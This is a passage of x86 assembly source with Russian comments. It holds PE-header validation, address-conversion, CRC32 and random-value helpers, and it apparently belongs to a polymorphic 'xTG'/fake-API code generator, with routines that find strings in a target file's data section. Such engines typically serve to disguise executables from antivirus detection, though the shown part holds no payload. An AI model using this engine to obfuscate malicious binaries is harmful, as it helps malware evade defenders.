;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx	 
valid_pe:
	push	esi
	xor		eax, eax
	mov		esi, dword ptr [esp + 08h]
	assume	esi: ptr IMAGE_DOS_HEADER
	cmp		[esi].e_magic, 'ZM'
	jne		_vp_xuita_
	cmp		[esi].e_lfanew, 200h
	jae		_vp_xuita_
	add		esi, [esi].e_lfanew
	assume	esi: ptr IMAGE_NT_HEADERS
	cmp		[esi].Signature, 'EP'
	jne		_vp_xuita_
	cmp		[esi].FileHeader.Machine, IMAGE_FILE_MACHINE_I386
	jne		_vp_xuita_
	cmp		[esi].FileHeader.NumberOfSections, 0
	je		_vp_xuita_
	cmp		[esi].FileHeader.NumberOfSections, 96
	jae		_vp_xuita_
	test	[esi].FileHeader.Characteristics, IMAGE_FILE_EXECUTABLE_IMAGE
	je		_vp_xuita_
	test	[esi].FileHeader.Characteristics, IMAGE_FILE_32BIT_MACHINE
	je		_vp_xuita_ 
	cmp		[esi].OptionalHeader.Magic, IMAGE_NT_OPTIONAL_HDR32_MAGIC
	jne		_vp_xuita_
	cmp		[esi].OptionalHeader.Subsystem, IMAGE_SUBSYSTEM_WINDOWS_GUI
	jb		_vp_xuita_
	cmp		[esi].OptionalHeader.Subsystem, IMAGE_SUBSYSTEM_WINDOWS_CUI
	ja		_vp_xuita_
	inc		eax
_vp_xuita_:
	pop		esi
	ret		04
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи valid_pe
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx	



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа rva_to_offset
;перевод RVA в смещение в файле (получения смещения (+ база мэппинга) в файле по RVA);
;ВХОД (stdcall DWORD rva_to_offset(LPVOID pExe, DWORD rva, imSh)):
;	pExe		-	база мэппинга файла (резалт от функи MapViewOfFile) aka адрес файла в памяти; 
;	rva			-	относительный виртуальный адрес
;	imSh		-	адрес переменной, в которую на выходе запишется значение;
;ВЫХОД:
;	EAX			-	смещение в файле (абсолютный адрес в файле) или 0 (если нихера не получилось найти 
;					по rva смещение); 
;	imSh		-	адрес в файле на элемент в таблице секций. Этот элемент соотв-ет секции, в 
;					пределах которой лежит rva; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
rto_mapped_addr		equ		dword ptr [ebp + 24h]						;база мэппинга
rto_rva				equ		dword ptr [ebp + 28h]						;RVA
rto_imsh			equ		dword ptr [ebp + 2Ch]						;адрес переменной

rva_to_offset:
	pushad																;сохраняем реги
	mov		ebp, esp 
	mov		esi, rto_mapped_addr										;esi - mapped_addr
	assume	esi: ptr IMAGE_DOS_HEADER
	add		esi, [esi].e_lfanew
	assume	esi: ptr IMAGE_NT_HEADERS
	mov		eax, rto_imsh
	and		dword ptr [eax], 0
	movzx	ecx, [esi].FileHeader.NumberOfSections						;ecx - кол-во секций в файле
	movzx	edx, [esi].FileHeader.SizeOfOptionalHeader					;размер структуры IMAGE_OPTIONAL_HEADER
	mov		ebx, [esi].OptionalHeader.FileAlignment
	lea		esi, dword ptr [esi + edx + sizeof (DWORD) + sizeof (IMAGE_FILE_HEADER)]	
	assume	esi: ptr IMAGE_SECTION_HEADER
	mov		eax, rto_rva												;eax = RVA 	
	cmp		eax, [esi].VirtualAddress									;может быть rva лежит в пределах заголовка?
	jb		_rto_ret_
	xor		eax, eax
_rto_nxt_sec_cycle_:													;иначе начнём поиск, в какую секцию указывает переданный rva; 
_rto_get_sec_minsize_:
	mov		edi, [esi].SizeOfRawData									;edi - физический размер секции
	mov		edx, [esi].Misc.VirtualSize									;edx - виртуальный размер секции
	test	edi, edi													;далее, тут определим минимальный из двух размеров секции
	je		_rto_vs_
	test	edx, edx
	je		_rto_nxt_1_
	cmp		edx, edi
	jae		_rto_nxt_1_
_rto_vs_:	
	mov		edi, edx													;edi - содержит минимальный размер (между физическим и виртуальным) секции; 
_rto_nxt_1_:
	mov		edx, [esi].VirtualAddress									;теперь определим, какой секции принадлежит rva
	cmp		rto_rva, edx
	jb		_rto_nxtsec_
	add		edx, edi
	cmp		rto_rva, edx
	jae		_rto_nxtsec_
	mov		eax, rto_rva
	sub		eax, [esi].VirtualAddress									;если нашли такую секцию, тогда найдем оффсет и прибавим базу мэппинга
	xchg	eax, edx
	
	push	ebx
	push	[esi].PointerToRawData
	call	align_down													;причем физический адрес секции выровняем на нижнюю границу; 

	add		eax, edx													;в eax - лежит оффсет в файле
	mov		edx, rto_imsh												;edx - содержит адрес переменной
	mov		dword ptr [edx], esi										;запишем в эту переменную адрес на элемент в табличке секций; 
_rto_nxtsec_:
	add		esi, sizeof (IMAGE_SECTION_HEADER)							;иначе смещаемся на сравнение другого элемента в таблице секций; 
	dec		ecx
	jne		_rto_nxt_sec_cycle_
	test	eax, eax													;если eax != 0, тогда секция была найдена
	je		_rto_ret_1_													;иначе секция не найдена, в резалте сохраним 0; 	
_rto_ret_:
	add		eax, rto_mapped_addr										;добавляем базу мэппинга
_rto_ret_1_:
	mov		dword ptr [ebp + 1Ch], eax									;и сохраняем всё это дело в eax;
	mov		esp, ebp
	popad
	ret		04 * 3														;выходим 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи rva_to_offset
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx	



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа offset_to_va
;перевод физического адреса (в файле) в виртуальный (в памяти aka VA);
;ВХОД (stdcall DWORD offset_to_va(LPVOID pExe, DWORD offs)):
;	pExe		-	база мэппинга файла (резалт от функи MapViewOfFile) aka адрес файла в памяти; 
;	offs		-	физический адрес в файле; 
;ВЫХОД:
;	EAX			-	VA в памяти или 0 (если нихера не получилось найти); 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
otv_mapped_addr		equ		dword ptr [ebp + 24h]						;база мэппинга
otv_offset			equ		dword ptr [ebp + 28h]						;offset

otv_image_base		equ		dword ptr [ebp - 04]						;ImageBase; 

offset_to_va:
	pushad																;сохраняем реги
	mov		ebp, esp 
	sub		esp, 08
	mov		esi, otv_mapped_addr										;esi - mapped_addr
	assume	esi: ptr IMAGE_DOS_HEADER
	sub		otv_offset, esi												;отнимаем от физического адреса базу мэппинга
	add		esi, [esi].e_lfanew
	assume	esi: ptr IMAGE_NT_HEADERS
	mov		eax, [esi].OptionalHeader.ImageBase
	mov		otv_image_base, eax											;сохраняем в данной переменной ImageBase;
	movzx	ecx, [esi].FileHeader.NumberOfSections						;ecx - кол-во секций в файле
	movzx	edx, [esi].FileHeader.SizeOfOptionalHeader					;размер структуры IMAGE_OPTIONAL_HEADER
	mov		ebx, [esi].OptionalHeader.FileAlignment
	lea		esi, dword ptr [esi + edx + sizeof (DWORD) + sizeof (IMAGE_FILE_HEADER)]	
	assume	esi: ptr IMAGE_SECTION_HEADER
	mov		eax, otv_offset												;eax = offset
	cmp		eax, [esi].PointerToRawData									;может быть offset лежит в пределах заголовка?
	jb		_otv_ret_
	xor		eax, eax
_otv_nxt_sec_cycle_:													;иначе начнём поиск, в какую секцию указывает переданный offset; 
_otv_get_sec_minsize_:
	mov		edi, [esi].SizeOfRawData									;edi - физический размер секции
	mov		edx, [esi].Misc.VirtualSize									;edx - виртуальный размер секции
	test	edi, edi													;далее, тут определим минимальный из двух размеров секции
	je		_otv_vs_
	test	edx, edx
	je		_otv_nxt_1_
	cmp		edx, edi
	jae		_otv_nxt_1_
_otv_vs_:	
	mov		edi, edx													;edi - содержит минимальный размер (между физическим и виртуальным) секции; 
_otv_nxt_1_:
	mov		edx, [esi].PointerToRawData									;теперь определим, какой секции принадлежит offset
	cmp		otv_offset, edx
	jb		_otv_nxtsec_
	add		edx, edi
	cmp		otv_offset, edx
	jae		_otv_nxtsec_
	mov		eax, otv_offset
	sub		eax, [esi].PointerToRawData									;если нашли такую секцию, тогда найдем rva и прибавим ImageBase; 
	xchg	eax, edx
	
	push	ebx
	push	[esi].VirtualAddress
	call	align_down													;причем виртуальный адрес секции выровняем на нижнюю границу; 

	add		eax, edx													;в eax - лежит rva;
_otv_nxtsec_:
	add		esi, sizeof (IMAGE_SECTION_HEADER)							;иначе смещаемся на сравнение другого элемента в таблице секций; 
	dec		ecx
	jne		_otv_nxt_sec_cycle_
	test	eax, eax													;если eax != 0, тогда секция была найдена
	je		_otv_ret_1_													;иначе секция не найдена, в резалте сохраним 0; 	
_otv_ret_:
	add		eax, otv_image_base											;добавляем базовый адрес загрузки; 
_otv_ret_1_:
	mov		dword ptr [ebp + 1Ch], eax									;и сохраняем всё это дело в eax;
	mov		esp, ebp
	popad
	ret		04 * 2														;выходим 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи offset_to_va
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx	



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;func align_down
;выравние значения вниз
;C-вариант: 
;#define ALIGN_DOWN(x, y)	(x & (~(y - 1)))	//вниз; 
;ВХОД (stdcall int align_down(int x, int y)):
;	x	-	значение, которое нужно выровнять вниз
;	y	-	выравнивающий фактор
;ВЫХОД:
;	EAX	-	выровненное значение;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
align_down:
	push	ecx
	mov		eax, dword ptr [esp + 08]									;x
	mov		ecx, dword ptr [esp + 12]									;y
	dec		ecx
	not		ecx
	and		eax, ecx													;выравниваем
	pop		ecx
	ret		04 * 2														;выходим; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи align_down 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функция xstrlen
;вычисление длины строки
;ВХОД (stdcall: DWORD xstrlen(char *pszStr)):
;	pszStr	-	указатель на строку, чью длину надо посчитать 
;ВЫХОД:
;	EAX		-	длина строки (в байтах) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xstrlen:
	push	edi		 
	mov		edi, dword ptr [esp + 08]
	push	edi  
	xor		eax, eax
_numsymbol_: 
	scasb
	jne		_numsymbol_
	xchg	eax, edi
	dec		eax
	pop		edi
	sub		eax, edi
	pop		edi  
	ret		4
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции xstrlen 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функция xCRC32A
;вычисление CRC32 строки
;ВХОД (stdcall DWORD xCRC32A(char *pszStr)):
;	pszStr		-	строка, чей хэш надо посчитать 
;ВЫХОД:
;	(+) EAX		- 	хэш от строки 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xCRC32A:
	push	ecx
	mov		ecx, dword ptr [esp + 08]   

	push	ecx
	call	xstrlen

	test	eax, eax
	je		_xcrc32aret_

	push	eax
	push	ecx 
	call	xCRC32

_xcrc32aret_: 
	pop		ecx 
	ret		4 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции xCRC32A 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 			



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функция xCRC32
;подсчет CRC32 
;ВХОД (stdcall DWORD xCRC32(BYTE *pBuffer, DWORD dwSize)):
;	pBuffer		- 	буфер, в котором код, чей crc32 надо посчитать
;	dwSize		- 	сколько байт посчитать ? (+) 
;ВЫХОД:
;	(+) EAX		-	CRC32 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xCRC32:
	pushad
	mov		ebp, esp
	xor		eax, eax
	mov		edx, dword ptr [ebp + 24h]
	mov		ecx, dword ptr [ebp + 28h]
	test	ecx, ecx
	je		@4	
	;jecxz	@4 
	dec		eax 
@1:
	xor		al, byte ptr [edx]
	inc		edx
	push	08
	pop		ebx
@2:
	shr		eax, 1
	jnc		@3
	xor		eax, 0EDB88320h
@3:
	dec		ebx 
	jnz		@2
	dec		ecx
	jne		@1
	;loop	@1
	not		eax
@4:
	mov		dword ptr [ebp + 1Ch], eax 
	popad
	ret		4 * 2 							
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx		
;конец функции xCRC32 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx		
;функция rnd_swap_elem
;перемешивание элементов в массиве случайным образом
;ВХОД:
;	edx		-	кол-во элементов в массиве
;	edi		-	адрес на массив, чьи элементы надо случайным образом перемешать
;ВЫХОД:
;	(+)		-	случайным образом перемешанные элементы заданного массива;
;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	 
rnd_swap_elem:
	push	ecx
	xor		ecx, ecx

_rse_cycle_:
	push	edx
	call	[ebx].rang_addr

	push	dword ptr [edi + ecx * 4]
	push	dword ptr [edi + eax * 4]
	pop		dword ptr [edi + ecx * 4]
	pop		dword ptr [edi + eax * 4]
	inc		ecx
	cmp		ecx, edx
	jne		_rse_cycle_ 
	pop		ecx
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx		
;конец функции rnd_swap_elem
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа faka_get_rnd_val_va
;получение виртуального адреса (VA) случайного числа или строки в переданной области памяти; 
;если есть изменения генерации в движке xTG, тогда сделать нужные коррективы и здесь; 
;Значит, для получения адреса числа в области памяти  - нужен только корректный адрес, в который можно 
;будет читать и писать. Чтобы получить адрес строки, строка должна была быть сгенерирована с этими 
;условиями:
;
; (+) размер числа = 4 байта;
; (+) длина строки кратна 4 - и выровнена нулями;
; (+) строка с нулём(ями) в конце;
; (+) адрес строки и числа кратен 4; 
; (+) число - 32-х разрядное; строка ansi; 
;
;ВХОД:
;	EBX		-	etc;
;	EAX		-	возможные значения:
;				FAKA_GET_RND_NUM32_ADDR - если нужно получить адрес случайного числа в переданной области 
;				памяти (rdata_addr & rdata_size);
;				FAKA_GET_RND_STRA_ADDR - если нужно получить адрес случайной строки etc; 
;ВЫХОД:
;	EAX		-	0, если адрес не удалось получить; или адрес (va!) строки/числа; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

FAKA_GET_RND_NUM32_ADDR		equ		01h									;значения для eax; 
FAKA_GET_RND_STRA_ADDR		equ		02h 

fgrva_tmp_var1				equ		dword ptr [ebp - 04]				;вспомогательная переменная; 
fgrva_tmp_var2				equ		dword ptr [ebp - 08]

faka_get_rnd_val_va: 
	pushad																;сохраняем в стеке реги;
	mov		ebp, esp 
	sub		esp, 12
	xchg	eax, ecx													;ecx - теперь содержит флаги;
	mov		eax, [ebx].mapped_addr
	mov		fgrva_tmp_var2, eax 										;сохраним в данной переменной базу мэппинга; 
	mov		edx, [ebx].xdata_struct_addr
	assume	edx: ptr XTG_DATA_STRUCT

	call	faka_check_rdata											;вызываем функу проверки переданных данных: адрес и размер области памяти; 

	test	eax, eax													;если херня, тогда выходим
	je		_fgrva_ret_
	
	call	faka_get_rnd_rdata_addr										;получим случайный адрес в диапазоне области памяти;

	cmp		ecx, FAKA_GET_RND_NUM32_ADDR								;что получить: адрес строки или числа?
	je		_fgrva_otv_ 												;если числа, тогда всё, на выход=)! иначе получим адрес строки; 

	push	'abcd'														;01
	push	'efgh'														;02
	push	'ijkl'														;03
	push	'mnop'														;04
	push	'qrst'														;05
	push	'uvwx'														;06
	push	'yzAB'														;07
	push	'CDEF'														;08
	push	'GHIJ'														;09
	push	'KLMN'														;10
	push	'OPQR'														;11
	push	'STUV'														;12
	push	'WXYZ'														;13
	push	'0123'														;14
	push	'4567'														;15
	push	'89_.'														;16
	
	mov		fgrva_tmp_var1, esp											;сохраним адрес данной строки в локальной переменной; 

	xchg	eax, esi
	mov		ebx, [edx].rdata_addr
	add		ebx, [edx].rdata_size										;тут посчитаем, сколько байтов проверить, начиная от текущего выбранного адреса и до конца области памяти; 
	sub		ebx, esi													;в ebx - будем хранить это значение;

_fgrva_search_1st_byte_:												;итак, поехали =). Сначала найдём любой байт, который содержится в строке для генерации случайных строк (обозначим её как xgen_str); 
	dec		ebx 
	je		_fgrva_ret_0_1_												;если ни один из байтов, которые в строке xgen_str, не был найден в области памяти (начиная с выбранного адреса и до конца области памяти), тогда выходим; 
	mov		edi, fgrva_tmp_var1
	mov		ecx, (16 * 04)
	lodsb
	repne	scasb														;если же текущий проверяемый байт - не является одним из байтов в xgen_str, тогда переходим к сравнению следующего байта;
	jne		_fgrva_search_1st_byte_ 

_fgrva_check_addr_1_:													;если же байт был найден, тогда проверим, этот байт лежит по адресу, кратному 4-м?
	lea		eax, dword ptr [esi - 01]
	push	eax
	and		eax, 03
	pop		eax
	jne		_fgrva_search_1st_byte_ 									;если не так, тогда снова будем искать любой байт в области памяти, который есть в строке xgen_str; 
	push	eax															;иначе сохраним адрес в стеке - это будет начало найденной строки; подозрение, что этот адрес мы и искали - нужно проверить; 

_fgrva_search_nxt_bytes_:												;если мы реально вышли на строку, тогда найдем её конец;
	dec		ebx															;конец - это любой найденный символ, который отсутствует в строке xgen_str; 
	je		_fgrva_ret_0_1_ 
	mov		edi, fgrva_tmp_var1
	mov		ecx, (16 * 04)
	lodsb
	repne	scasb
	je		_fgrva_search_nxt_bytes_

_fgrva_check_final_bytes_:												;если мы дошли до конца, 
	cmp		ebx, 04
	jl		_fgrva_ret_0_1_ 
	lea		ecx, dword ptr [esi - 01]
	mov		edi, ecx
	and		ecx, 03														;тогда берем текущий адрес и проверим на нули N байт. N - это такое число, что если его прибавить к данному адресу - то получится адрес, кратный 4-м; 
	sub		ecx, 04
	neg		ecx
	xor		eax, eax
	repe	scasb
	pop		eax
	jne		_fgrva_search_1st_byte_ 									;если это не нули, тогда это явно не строка;

_fgrva_otv_:	
	cmp		[edx].rdata_pva, XTG_OFFSET_ADDR							;проверим, какой адрес передан в rdata_addr: физический или виртуальный?
	jne		_fgrva_ret_													;если физический, тогда переведём его в va; иначе так и оставим; 

	push	eax															;физический адрес 
	push	fgrva_tmp_var2												;база мэппинга; 
	call	offset_to_va												;вызываем функу перевода физического адреса (в файле) в виртуальный адрес (в памяти); 
	
	test	eax, eax
	jne		_fgrva_ret_ 												;иначе мы нашли случайную строку и её адрес сохранили в eax; 

_fgrva_ret_0_1_:
	xor		eax, eax
		
_fgrva_ret_:
	mov		dword ptr [ebp + 1Ch], eax
	mov		esp, ebp 
	popad
	ret 																;выходим; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_get_rnd_val_va
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa faka_get_rnd_num_1 
;получение СЧ по некоторой маске;
;ВХОД:
;	EAX		-	число N;
;ВЫХОД:
;	EAX		-	СЧ в диапазоне [0..N-1]; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
faka_get_rnd_num_1:
	push	edx
	
	push	eax
	call	[ebx].rang_addr

	xchg	eax, edx
	
	push	edx
	call	[ebx].rang_addr

	and		eax, edx													;eax = СЧ; 
	pop		edx
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_get_rnd_num_1 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа faka_get_rnd_r32
;получение случайного 32-х битного рега;
;ВХОД:
;	ebx		-	etc
;ВЫХОД:
;	EAX		-	случайный рег32; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
faka_get_rnd_r32:
	push	8
	call	[ebx].rang_addr
	ret 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_get_rnd_r32
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa faka_check_rdata 
;проверка адреса и размера данных на валидность; 
;ВХОД:
;	EBX		-	FAKA_FAKEAPI_GEN
;	etc
;ВЫХОД:
;	EAX		-	1, если можно юзать (для генерации команд) переданную область данных, иначе 0; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
faka_check_rdata:
	xor		eax, eax
	push	esi
	mov		esi, [ebx].xdata_struct_addr
	assume	esi: ptr XTG_DATA_STRUCT
	test	esi, esi
	je		_fcd_ret_
	cmp		[esi].rdata_addr, 00h										;если адрес начала области данных (секции данных) равен нулю, 
	je		_fcd_ret_													;то на выход;
	cmp		[esi].rdata_size, 04h										;иначе если размер области (секции) данных меньше 4-х, тогда на выход; 
	jb		_fcd_ret_ 
	inc		eax															;иначе всё отлично=)! 
_fcd_ret_:
	pop		esi
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_check_rdata
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa faka_check_xdata 
;проверка адреса и размера данных на валидность; 
;ВХОД:
;	EBX		-	FAKA_FAKEAPI_GEN
;	etc
;ВЫХОД:
;	EAX		-	1, если можно юзать (для генерации команд) переданную область данных, иначе 0; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
faka_check_xdata:
	xor		eax, eax
	push	esi
	mov		esi, [ebx].xdata_struct_addr
	assume	esi: ptr XTG_DATA_STRUCT
	test	esi, esi
	je		_fcxd_ret_
	cmp		[esi].xdata_addr, 00h										;если адрес начала области данных (секции данных) равен нулю, 
	je		_fcxd_ret_													;то на выход;
	cmp		[esi].xdata_size, 04h										;иначе если размер области (секции) данных меньше 4-х, тогда на выход; 
	jb		_fcxd_ret_ 
	inc		eax															;иначе всё отлично=)! 
_fcxd_ret_:
	pop		esi
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_check_xdata
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa faka_get_rnd_rdata_addr   
;получение случайного адреса (в файле, а не в памяти!) в секции данных. Случайный адрес кратен четырём; 
